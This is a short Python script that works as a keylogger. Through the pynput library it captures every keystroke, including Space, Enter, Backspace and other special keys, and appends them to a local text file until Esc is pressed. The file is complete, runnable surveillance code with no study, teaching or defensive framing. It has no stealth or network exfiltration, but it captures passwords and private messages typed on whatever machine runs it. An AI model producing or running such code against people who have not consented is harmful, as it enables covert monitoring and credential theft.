from pynput import keyboard

# Define the file where keystrokes will be logged
log_file = "key_log.txt"

# This function will be called whenever a key is pressed
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., space, enter, backspace)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("<BACKSPACE>")
            else:
                f.write(f"<{key.name.upper()}>")

# This function will be called whenever a key is released
def on_release(key):
    # You can add a condition to stop the listener if needed
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
